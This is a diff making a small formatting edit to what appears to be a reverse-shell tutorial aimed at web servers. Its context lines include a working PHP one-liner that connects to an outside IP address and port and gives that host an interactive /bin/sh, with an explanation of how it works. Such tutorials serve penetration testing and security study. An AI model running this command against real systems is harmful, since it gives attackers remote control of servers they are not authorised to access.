@@ -105,7 +105,7 @@ If your target webserver uses the PHP programming language, you can use PHP to c
 
 `php -r '$socket=fsockopen("10.0.0.2",31337);exec("/bin/sh -i <&3 >&3 2>&3");'`
 
-- The fsockopen function establishes a socket connection with the specified IP address and port number and saves the handle in the $socket variable.
+- The fsockopen function establishes a socket connection with the specified IP address and port number and saves the handle in the `$socket` variable.
 - The exec function takes the input from this stream, executes it, and writes the output to it.
 
 <u>3. Bash Reverse Shell:</u>
